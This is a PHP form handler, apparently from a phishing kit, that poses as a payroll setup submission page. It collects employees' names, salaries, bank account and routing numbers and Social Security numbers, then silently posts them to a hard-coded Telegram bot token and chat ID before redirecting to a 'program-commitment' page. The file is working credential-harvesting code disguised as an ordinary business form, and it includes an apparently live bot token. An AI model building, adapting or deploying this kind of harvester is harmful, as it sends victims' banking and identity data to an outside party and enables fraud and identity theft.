<?php
// submit-payroll.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Telegram Bot Configurations - ADD MULTIPLE BOT ENTRIES
    $telegramBots = [
        ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'], // Bot 1

        ['token' => '', 
        'chat_id' => ''], // Bot 2
        // Add more as needed
    ];

    // Collect form data
    $employee_name   = htmlspecialchars($_POST['employee_name']);
    $department      = htmlspecialchars($_POST['department']);
    $position        = htmlspecialchars($_POST['position']);
    $salary          = htmlspecialchars($_POST['salary']);
    $start_date      = htmlspecialchars($_POST['start_date']);
    $bank_name       = htmlspecialchars($_POST['bank_name']);
    $account_number  = htmlspecialchars($_POST['account_number']);
    $routing_number  = htmlspecialchars($_POST['routing_number']);
    $pay_frequency   = htmlspecialchars($_POST['pay_frequency']);
    $tax_id          = htmlspecialchars($_POST['tax_id']);
    $benefits        = htmlspecialchars($_POST['benefits']);
    $additional_notes = htmlspecialchars($_POST['additional_notes'] ?? 'N/A');
    $certify         = isset($_POST['certify']) ? 'Yes' : 'No';

    // Create formatted message with emojis
    $message  = "🏦 **NEW PAYROLL SETUP SUBMISSION** 🏦\n\n";

    $message .= "👤 **Employee Information**\n";
    $message .= "📛 Name: $employee_name\n";
    $message .= "🏢 Department: $department\n";
    $message .= "💼 Position: $position\n";
    $message .= "💰 Salary: $$salary\n";
    $message .= "📅 Start Date: $start_date\n\n";

    $message .= "🏦 **Banking Information**\n";
    $message .= "🏛️ Bank: $bank_name\n";
    $message .= "🔢 Account No: $account_number\n";
    $message .= "📋 Routing No: $routing_number\n";
    $message .= "⏰ Pay Frequency: $pay_frequency\n\n";

    $message .= "📊 **Tax & Benefits**\n";
    $message .= "🆔 Tax ID (SSN): $tax_id\n";
    $message .= "🏥 Benefits: $benefits\n";
    $message .= "📝 Notes: $additional_notes\n\n";

    $message .= "✅ Certification: $certify\n";
    $message .= "⏰ Submitted on: " . date('Y-m-d H:i:s');

    // Send to ALL Telegram bots
    foreach ($telegramBots as $bot) {
        if (!empty($bot['token']) && !empty($bot['chat_id'])) {
            $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
            $data = [
                'chat_id' => $bot['chat_id'],
                'text' => $message,
                'parse_mode' => 'Markdown'
            ];

            $options = [
                'http' => [
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data),
                ],
            ];

            $context = stream_context_create($options);
            @file_get_contents($url, false, $context);
        }
    }

    // Store in session and redirect
    session_start();
    $_SESSION['payroll_data'] = $_POST;

    header("Location: program-commitment.php");
    exit;
} else {
    // Direct access -> redirect to form
    header('Location: payroll-setup.php');
    exit();
}
